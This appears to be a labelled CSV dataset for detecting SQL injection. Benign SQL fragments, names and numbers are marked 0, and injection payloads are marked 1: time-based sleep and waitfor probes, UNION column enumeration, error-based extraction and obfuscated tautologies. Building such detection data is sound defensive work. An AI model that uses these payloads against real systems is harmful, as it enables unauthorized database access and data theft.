Query,Label,cluster,stratify_col
select familiar,0,7,0_7
"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh",1,9,1_9
"4'; )~ ]   } and   ?&)3x8o0o0o8b0b1011101001001000011111010100101111001   like&|}(Ã¢Â (* select
count/*g_i)sjraohw+a/ev{w$jl[)b0x4pti6kkr0b1000*/ (& *=)\`/from all_users}t0b0o0b0x0o0b0o0b0o8,all_users$t0b18,all_users[t0b110o0o0o0o5,all_users/*{taj~j~?|hcst*/t4o0o3,all_users-t0x8}[)$ 
 &&  * ( :'ajkb'='ajkb",1,9,1_9
"' union select 1,2,3--",1,4,1_4
select bin ( 111 ) ,0,4,0_4
"   select count ( character ) , poor from curious by fort",0,1,0_1
"1%""   )    )     )   union all select null,null,null--",1,4,1_4
"'/**/and1=1--
",1,0,1_0
"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",1,4,1_4
"1'||  (  select 'epjr' from dual where 3074  =  3074 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,4,1_4
select avg ( floor ) from safe select sum ( desk ) ,0,1,0_1
1%'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  '%'  =  ',1,9,1_9
"-8793' where 3853  =  3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",1,4,1_4
"7""`/*clxe;3yvl>@*/ )}   ) ]
 waitfor delay '5o5:(select(selectÃ¢Â (select (select 8)))):2'*and
	 '(   Ã¢Â (   ""witb"" %like  ""witb",1,2,1_2
"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""uncg""  =  ""uncg",1,4,1_4
; select pg_sleep(5);  xor 'a'='a'----d2igafdj3gyx92e,1,0,1_0
brgmann saura,0,8,0_8
nort$ea,0,8,0_8
select broken ( s )  from had union all,0,1,0_1
"granados 151,",0,0,0_0
%u0027%u0020or%u0020exists(select%u00201%u0020from%u0020users)--,1,2,1_2
";select
pg_sleep(5);/*
*/--
",1,0,1_0
"8'  ') \ {)   {  &&  /*?9ns*r*/(select 0x0xdba)  like  /*(select (select 0x0));`z7j
*/(  select count@ ({]* <) < from+domain.domains as t3,domain.columns>as/*k{(select;0o0x0b0xd2)$v8>a-(select (select~(select (select (select 0)))))]w*/t5,domain.tables.asÃ¢Â t0x6  ) < and{  (-& 
(  ;'miba'='mibab4o5",1,2,1_2
' or '1' = '1,1,9,1_9
select animal from first,0,7,0_7
select min ( entirely )  as factory from straight,0,1,0_1
"-3278'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'zxig' like 'zxig",1,9,1_9
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null--",1,4,1_4
select * from beat,0,5,0_5
"'    union    select    null,    null,    null    --    --w8xrkd2jd4c39",1,4,1_4
 (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,1,4,1_4
test'%u0020or%u0020%u00271%u0027>=%u00271%u0027%u0020--%u0020,1,2,1_2
mccauley@autobuses-hibridos.ph,0,0,0_0
" and (select+(select 0o1x0b0o10x6))  like ;utl_inaddr.get_host_address	  (   >(  	select distinct, (  table_name{ )   from   (  select\distinct  (  table_name  )^ , rownum as limit from/*(/y!ry ul*`l'lkÃ¢Â pq3ze]m*/sys.all_tables  )  	where@limit  like  (select 2o1o9b0x30)\  );  ()    and^'i'` like  'i",1,4,1_4
"8b11x1"" where
8x23dd
 like\@1o0b11012110101801;and (select-0b0x91aa90cff72) like ? (  select count	 (
i=wuo*/**/ )} [from~all_users>t0b1,all_users t0o0b0x0b10,all_users t0o3,all_users]t0b0x4,all_users+t0o4+	)[|or/*e7|&bcu&e	x2*/0b0x0o0-or;0b0b0b0o0b1111100003b110x0b10711d8  like  (select 0b0b10010001102010010000101010110100101011011010) or-""e^q""=""e^q/"";or 'vy'+like{'vyj'
or/(select%(select`(select0x825)))=0xa0x0b110010and""d""]like+""d""-and}""jd""<>""jdq""_or]false and;(select (select (select_(select (select (select (select (select 0x90b))))))))=5x97b@or ""5ae""!=""
5ae""(or false and'(select'0x1) <or .(select (select (select\(select 0x60f9))))<>0x10f9  or  false and ""yq""<>""yqy"" or (select (select (select 0))) or 0 --",1,2,1_2
9810,0,3,0_3
' or '1'='1,1,9,1_9
2771560000000000,0,3,0_3
"  select showid as id, immediately as brave from warn",0,7,0_7
1  )   where 1402  =  1402,1,6,1_6
"  select waitid as id, where as apartment from closely",0,7,0_7
select avg ( silver )  from concerned  select sum ( load ) ,0,1,0_1
"  select ifnull ( null, ""w3schools.com"" ) ;",0,4,0_4
select top 3 * from individual,0,5,0_5
-4032'  )   where 5157  =  5157 or 1809  =  2810#,1,6,1_6
"0b0o0o1'   )    ) ]  as uuuk where (select (select (select 7254))) /**/=  0x6x0dd2 and (select (select (select 0x1b19))) ]= 'dbms_pipe.receive_message <(  chr ((  (select 0b0x4c)/**/ )   or chr\ ( ;9o0o156  )   or chr  (  (select (select (select (select 104))))  ) =||chr 	(*0x0o6o0x33  )  ,(select (select 0x5))  )  and/*(\~g.u?]k9*/(select (select 0x0))  or  'l' not = 'l' and (select (select (select|(select (select 0972))))) not like (select 0x254d) *or  'h'  not'like 	'h' and true and 'c*'<>'c*v' || '}'='}v'[and true --",1,4,1_4
ferne,0,8,0_8
0m24gu1l39,0,3,0_3
select * from voyage where pair not like 'stream%',0,7,0_7
"1""  )   where 8878  =  8878 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,4,1_4
